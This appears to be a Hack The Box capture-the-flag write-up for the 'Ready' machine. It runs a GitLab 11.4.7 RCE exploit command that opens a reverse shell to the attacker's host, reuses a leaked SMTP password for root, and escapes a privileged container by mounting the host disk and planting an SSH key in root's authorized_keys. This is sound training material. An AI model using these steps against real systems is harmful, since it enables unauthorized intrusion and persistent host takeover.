---
layout: single
title: Ready - Hack The Box
excerpt: "Ready was a pretty straighforward box to get an initial shell on: We identify that's it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we're in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory."
date: 2021-05-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-ready/ready_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - gitlab
  - cve
  - docker
  - privileged container
---

![](/assets/images/htb-writeup-ready/ready_logo.png)

Ready was a pretty straighforward box to get an initial shell on: We identify that's it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we're in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.

## Portscan

```
sudo nmap -T4 -sC -sV -oA scan -p- 10.129.149.31
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 22:41 EDT
Nmap scan report for 10.129.149.31
Host is up (0.015s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.149.31:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
```

## Gitlab

The webserver on port 5080 runs a Gitlab instance.

![](/assets/images/htb-writeup-ready/gitlab1.png)

We have access to create a new account.

![](/assets/images/htb-writeup-ready/gitlab2.png)

Once logged in, we see in the projects list there's a single projet called *ready-channel*.

![](/assets/images/htb-writeup-ready/gitlab3.png)

To check the Gitlab version we go to the Help section and we can see it's running 11.4.7.

![](/assets/images/htb-writeup-ready/gitlab5.png)

A quick search on Exploit-DB shows there's an authenticated remote code execution vulnerability for this exact version.

![](/assets/images/htb-writeup-ready/gitlab6.png)

`python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444`

Reverse shell connection:

![](/assets/images/htb-writeup-ready/shell.png)

![](/assets/images/htb-writeup-ready/user.png)

## Privesc

By running [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) we find a backup file with some SMTP credentials for the gitlab application. 

```
Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

That password is the same password as the root password for the container so we can privesc locally inside the container.

```
git@gitlab:/opt/backup$ su -l root
su -l root
Password: wW59U!ZKMbG9+*#h

root@gitlab:~# 
```

There's a root_pass file in the root of the filesystem but that's not useful.

```
cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
```

If we look at the `/opt/backup/docker-compose.yml` configuration file, we can see it's a hint that we're running in a privileged container:

```
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m
```

Privileged containers can access the host's disk devices so we can just read the root flag after mounting the drive.

![](/assets/images/htb-writeup-ready/root.png)

To get a proper shell in the host OS we can drop our SSH keys in the root's .ssh directory.

```
root@gitlab:~# mount /dev/sda2 /mnt
mount /dev/sda2 /mnt
root@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' > /mnt/root/.ssh/authorized_keys

[...]

$ ssh root@10.129.150.37
The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

[...]

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 11 14:28:18 2021
root@ready:~# cat root.txt
b7f98681505cd39066f67147b103c2b3
```